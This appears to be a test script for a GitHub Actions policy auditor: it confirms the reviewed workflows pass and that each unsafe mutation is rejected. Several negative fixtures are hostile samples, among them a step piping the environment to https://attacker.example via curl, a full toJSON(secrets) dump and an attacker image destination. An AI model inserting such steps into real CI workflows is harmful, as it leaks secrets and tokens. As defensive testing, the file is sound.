#!/usr/bin/env node

import assert from 'node:assert/strict';
import {
  cpSync,
  mkdtempSync,
  mkdirSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { parseDocument } from 'yaml';

import { auditRepository } from './audit-workflows.mjs';

const scriptPath = fileURLToPath(import.meta.url);
const repositoryRoot = resolve(dirname(scriptPath), '../..');

const copyPolicyFixture = (temporaryRoot) => {
  cpSync(join(repositoryRoot, '.github'), join(temporaryRoot, '.github'), {
    recursive: true,
  });
  cpSync(join(repositoryRoot, 'docker'), join(temporaryRoot, 'docker'), {
    recursive: true,
  });
};

const replace = (path, before, after) => {
  const source = readFileSync(path, 'utf8');
  assert.ok(source.includes(before), `test mutation anchor missing in ${path}`);
  writeFileSync(path, source.replace(before, after));
};

const assertRejected = (label, mutate, expectedFinding) => {
  const temporaryRoot = mkdtempSync(join(tmpdir(), 'cannon-workflow-policy-'));
  try {
    copyPolicyFixture(temporaryRoot);
    mutate(temporaryRoot);
    const findings = auditRepository(temporaryRoot);
    assert.ok(
      findings.some((finding) => finding.includes(expectedFinding)),
      `${label}: expected finding containing "${expectedFinding}", got:\n${findings.join(
        '\n'
      )}`
    );
  } finally {
    rmSync(temporaryRoot, { force: true, recursive: true });
  }
};

const assertAccepted = (label, mutate) => {
  const temporaryRoot = mkdtempSync(join(tmpdir(), 'cannon-workflow-policy-'));
  try {
    copyPolicyFixture(temporaryRoot);
    mutate(temporaryRoot);
    assert.deepEqual(
      auditRepository(temporaryRoot),
      [],
      `${label}: reviewed future workflow must remain accepted`
    );
  } finally {
    rmSync(temporaryRoot, { force: true, recursive: true });
  }
};

assert.deepEqual(
  auditRepository(repositoryRoot),
  [],
  'reviewed workflow baseline must pass'
);

{
  const runtimeWorkflowSource = readFileSync(
    join(repositoryRoot, '.github/workflows/runtime-image-security.yml'),
    'utf8'
  );
  const runtimeWorkflow = parseDocument(runtimeWorkflowSource).toJS();
  assert.equal(
    runtimeWorkflow.jobs['prepare-exact-digest-scans'].outputs.has_scans,
    '${{ steps.request.outputs.has_scans }}',
    'scheduled inventory must expose an explicit non-matrix emptiness gate'
  );
  assert.equal(
    runtimeWorkflow.jobs['scan-pushed-digest'].if,
    "needs.prepare-exact-digest-scans.outputs.has_scans == 'true'",
    'an all-inactive inventory must skip the exact-digest matrix job before expansion'
  );
  assert.equal(
    runtimeWorkflow.jobs['scan-pushed-digest'].strategy.matrix,
    '${{ fromJSON(needs.prepare-exact-digest-scans.outputs.matrix) }}',
    'exact-digest scans must expand only the validated protected inventory'
  );
  assert.equal(
    [
      ...runtimeWorkflowSource.matchAll(
        /verify-runtime-image\.sh \\\n\s+"\$IMAGE_REF" \\\n\s+"\$RUNTIME_KIND" \\/gu
      ),
    ].length,
    2,
    'every runtime verifier call must pass the explicit runtime kind'
  );
}

assertAccepted('composed disabled Reya Safe UI workflow', (root) => {
  mkdirSync(join(root, 'packages/reya-safe-ui'), { recursive: true });
  writeFileSync(
    join(root, 'packages/reya-safe-ui/package.json'),
    '{"name":"@usecannon/reya-safe-ui","private":true}\n'
  );
  writeFileSync(
    join(root, '.github/workflows/reya-safe-ui.yml'),
    [
      'name: Reya Safe UI',
      'on:',
      '  pull_request:',
      '    branches: [dev, main]',
      '  push:',
      '    branches: [dev, main]',
      '  workflow_dispatch:',
      'permissions:',
      '  contents: read',
      'jobs:',
      '  reya-safe-ui:',
      '    runs-on: ubuntu-24.04',
      '    timeout-minutes: 10',
      '    concurrency:',
      '      group: reya-safe-ui-${{ github.event.pull_request.number || github.run_id }}',
      "      cancel-in-progress: ${{ github.event_name == 'pull_request' }}",
      '    steps:',
      '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
      '        with:',
      '          persist-credentials: false',
      '      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271',
      '      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020',
      '      - run: pnpm --dir packages/reya-safe-ui test',
      '        env:',
      '          REYA_SAFE_UI_BUILD_SHA: ${{ github.sha }}',
      '      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02',
      '',
    ].join('\n')
  );
});

assertRejected(
  'deleted composed Reya Safe UI workflow',
  (root) => {
    mkdirSync(join(root, 'packages/reya-safe-ui'), { recursive: true });
    writeFileSync(
      join(root, 'packages/reya-safe-ui/package.json'),
      '{"name":"@usecannon/reya-safe-ui","private":true}\n'
    );
    rmSync(join(root, '.github/workflows/reya-safe-ui.yml'), { force: true });
  },
  'reya-safe-ui.yml: required workflow is missing'
);

assertRejected(
  'write permission',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      'permissions:\n  contents: read',
      'permissions:\n  contents: write'
    ),
  'permissions must be exactly contents: read'
);

assertRejected(
  'flow-style floating action',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      '      - { uses: actions/cache@v4 }\n      - run: pnpm i --frozen-lockfile'
    ),
  'action is not pinned to a full commit SHA'
);

assertRejected(
  'bracket secret reference',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      "      - run: pnpm i --frozen-lockfile\n        env:\n          LEAK: ${{ secrets['TOKEN'] }}"
    ),
  'repository secret reference is forbidden'
);

assertRejected(
  'bracket GitHub token reference',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      "      - run: pnpm i --frozen-lockfile\n        env:\n          TOKEN: ${{ github['token'] }}"
    ),
  'unreviewed GitHub context reference is forbidden'
);

assertRejected(
  'whole GitHub context reference',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      '      - run: pnpm i --frozen-lockfile\n        env:\n          CONTEXT: ${{ toJSON(github) }}'
    ),
  'unreviewed GitHub context reference is forbidden'
);

assertRejected(
  'computed GitHub token reference',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      "      - run: pnpm i --frozen-lockfile\n        env:\n          TOKEN: ${{ github[format('{0}', 'token')] }}"
    ),
  'unreviewed GitHub context reference is forbidden'
);

assertRejected(
  'delimiter-in-string computed GitHub token reference',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      "      - run: pnpm i --frozen-lockfile\n        env:\n          TOKEN: ${{ format('}}{0}', github[format('{0}', 'token')]) }}"
    ),
  'unreviewed GitHub context reference is forbidden'
);

assertRejected(
  'local composite action escape',
  (root) => {
    const actionDirectory = join(root, '.github/actions/escape');
    mkdirSync(actionDirectory, { recursive: true });
    writeFileSync(
      join(actionDirectory, 'action.yml'),
      [
        'name: Escape',
        'description: Negative policy fixture',
        'runs:',
        '  using: composite',
        '  steps:',
        '    - uses: actions/cache@v4',
        '',
      ].join('\n')
    );
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      '      - uses: ./.github/actions/escape\n      - run: pnpm i --frozen-lockfile'
    );
  },
  'action is not pinned to a full commit SHA'
);

assertRejected(
  'manual trigger',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      'on:\n  push:',
      'on:\n  workflow_dispatch:\n  push:'
    ),
  'events must be exactly'
);

assertRejected(
  'unreviewed workflow',
  (root) =>
    writeFileSync(
      join(root, '.github/workflows/publish.yml'),
      [
        'name: Publish',
        'on:',
        '  workflow_dispatch:',
        'permissions:',
        '  packages: write',
        'jobs:',
        '  publish:',
        '    runs-on: ubuntu-24.04',
        '    timeout-minutes: 5',
        '    steps:',
        '      - run: echo publish',
        '',
      ].join('\n')
    ),
  'workflow is not in the reviewed allowlist'
);

assertRejected(
  'unpinned service image',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend.yml'),
      'redis:7.4.2-alpine@sha256:02419de7eddf55aa5bcf49efb74e88fa8d931b4d77c07eff8a6b2144472b6952',
      'redis:7.4.2-alpine'
    ),
  'container image is not digest-pinned'
);

assertRejected(
  'persisted checkout credentials',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      'persist-credentials: false',
      'persist-credentials: true'
    ),
  'checkout must set persist-credentials: false'
);

assertRejected(
  'additional publisher permission',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      '      packages: write\n',
      '      packages: write\n      issues: write\n'
    ),
  'publisher job permissions must match'
);

assertRejected(
  'fail-open publisher gate',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      "vars.CANNON_SAFE_PUBLISH_ENABLED == 'true'",
      "vars.CANNON_SAFE_PUBLISH_ENABLED != 'false'"
    ),
  'Publisher workflow differs from the exact reviewed schema'
);

assertRejected(
  'publisher reusable workflow substitution',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      'uses: ./.github/workflows/safe-app-backend.yml',
      'uses: ./.github/workflows/lint.yml'
    ),
  'exact read-only call to the reviewed reusable workflow'
);

assertRejected(
  'publisher action substitution',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      'docker/setup-buildx-action@bb05f3f5519dd87d3ba754cc423b652a5edd6d2c',
      'docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130'
    ),
  'Publisher workflow differs from the exact reviewed schema'
);

assertRejected(
  'publisher image destination substitution',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      'IMAGE_NAME: ghcr.io/reya-labs/safe-app-backend',
      'IMAGE_NAME: ghcr.io/attacker/safe-app-backend'
    ),
  'Publisher workflow differs from the exact reviewed schema'
);

assertRejected(
  'publisher registry substitution',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      '          registry: ghcr.io',
      '          registry: r.example'
    ),
  'Publisher workflow differs from the exact reviewed schema'
);

assertRejected(
  'arbitrary publisher run step',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      '      - uses: docker/setup-buildx-action@',
      '      - run: env | curl --data-binary @- https://attacker.example\n' +
        '      - uses: docker/setup-buildx-action@'
    ),
  'Publisher workflow differs from the exact reviewed schema'
);

assertRejected(
  'whole publisher secrets context',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      '${{ secrets.GITHUB_TOKEN }}',
      '${{ toJSON(secrets) }}'
    ),
  'whole or computed secrets contexts'
);

assertRejected(
  'continued failure',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      '      - run: pnpm i --frozen-lockfile\n        continue-on-error: true'
    ),
  'continue-on-error is forbidden'
);

assertRejected(
  'deleted runtime security workflow',
  (root) =>
    rmSync(join(root, '.github/workflows/runtime-image-security.yml'), {
      force: true,
    }),
  'runtime-image-security.yml: required workflow is missing'
);

assertRejected(
  'runtime scan schedule drift',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      "    - cron: '23 6 * * 1'",
      "    - cron: '23 6 * * 2'"
    ),
  'schedule must exactly match the reviewed configuration'
);

assertRejected(
  'arbitrary runtime workflow step',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '      - name: Resolve immutable image metadata',
      '      - run: curl https://attacker.example\\n' +
        '      - name: Resolve immutable image metadata'
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime digest scanner package write permission',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '      packages: read',
      '      packages: write'
    ),
  'permissions must be exactly attestations: read, contents: read, and packages: read'
);

assertRejected(
  'runtime digest scanner broader permission',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '      packages: read',
      '      packages: read\n      issues: read'
    ),
  'permissions must be exactly attestations: read, contents: read, and packages: read'
);

assertRejected(
  'runtime digest scanner without attestation permission',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '      attestations: read\n',
      ''
    ),
  'permissions must be exactly attestations: read, contents: read, and packages: read'
);

assertRejected(
  'runtime verifier network sandbox relaxation',
  (root) =>
    replace(
      join(root, '.github/scripts/verify-runtime-image.sh'),
      '  --network none \\\n',
      '  --network bridge \\\n'
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime verifier skips default entry syntax validation',
  (root) =>
    replace(
      join(root, '.github/scripts/verify-runtime-image.sh'),
      '  node --check "/usr/app/${EXPECTED_ENTRY_FILE}"\n',
      ''
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime scanner substitution',
  (root) =>
    replace(
      join(root, '.github/scripts/scan-runtime-image.sh'),
      'fd4ab4d1042b522c896e73bdf09ab8bf384fa417df99d6dd0d6e1008c7e7c821',
      'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime bundle-input inventory relaxation',
  (root) =>
    replace(
      join(root, '.github/scripts/generate-bundle-input-sbom.mjs'),
      'if (components.size === 0) {\n',
      'if (components.size < 0) {\n'
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime digest scan from an untrusted workflow repository',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '          test "$TRUSTED_REPOSITORY" = "Reya-Labs/cannon"',
      '          test -n "$TRUSTED_REPOSITORY"'
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime digest scan without protected-dev attestation source',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '            --source-ref "$TRUSTED_REF" \\\n',
      ''
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime digest scan without approved signer workflow binding',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '            --signer-workflow "$SIGNER_WORKFLOW" \\\n',
      ''
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime digest scan with substituted signer workflow',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      'Reya-Labs/cannon/.github/workflows/safe-app-backend-publish.yml',
      'Reya-Labs/cannon/.github/workflows/runtime-image-security.yml'
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime digest scan without signer revision binding',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '            --signer-digest "$SIGNER_DIGEST" \\\n',
      ''
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'scheduled digest scan bypasses protected inventory',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '                .github/runtime-image-inventory.json',
      '                /tmp/unreviewed-runtime-image-inventory.json'
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'empty scheduled inventory expands as an invalid matrix',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      "    if: needs.prepare-exact-digest-scans.outputs.has_scans == 'true'",
      '    if: always()'
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime inventory policy substitution',
  (root) =>
    replace(
      join(root, '.github/runtime-image-inventory.json'),
      '"status": "inactive"',
      '"status": "active"'
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime publisher mapping substitution',
  (root) =>
    replace(
      join(root, '.github/scripts/validate-runtime-image-inventory.mjs'),
      'Reya-Labs/cannon/.github/workflows/safe-app-backend-publish.yml',
      'Reya-Labs/cannon/.github/workflows/runtime-image-security.yml'
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'missing final bundle-input evidence copy',
  (root) =>
    replace(
      join(root, 'docker/repo.Dockerfile'),
      'COPY --from=build /usr/app/bundle-input-dependencies.cdx.json ./bundle-input-dependencies.cdx.json\n',
      ''
    ),
  'bundle-input evidence must be generated once'
);

assertRejected(
  'alternate bundle-input evidence output path',
  (root) =>
    replace(
      join(root, 'docker/indexer.Dockerfile'),
      '/usr/app/bundle-input-dependencies.cdx.json \\\n',
      '/usr/app/packages/indexer/dist/bundle-input-dependencies.cdx.json \\\n'
    ),
  'bundle-input evidence must be generated once'
);

assertRejected(
  'fallback bundle-input evidence lookup',
  (root) =>
    replace(
      join(root, '.github/scripts/scan-runtime-image.sh'),
      '  docker cp \\\n',
      '  find /usr/app -name bundle-input-dependencies.cdx.json\n' +
        '  docker cp \\\n'
    ),
  'without fallback lookup'
);

assertRejected(
  'runtime verifier omits the exact bundle-input path assertion',
  (root) =>
    replace(
      join(root, '.github/scripts/verify-runtime-image.sh'),
      '      test "$bundle_input_paths" = "$bundle_input_path"\n',
      ''
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime verifier accepts a symlinked bundle-input inventory',
  (root) =>
    replace(
      join(root, '.github/scripts/verify-runtime-image.sh'),
      '      test ! -L "$bundle_input_path"\n',
      ''
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime digest scan without protected dev ancestry',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '          git -C policy merge-base --is-ancestor "$EXPECTED_REVISION" HEAD',
      '          git -C policy cat-file -e "${EXPECTED_REVISION}^{commit}"'
    ),
  'source must exactly match the reviewed workflow digest'
);

console.log('Workflow policy negative probes passed.');
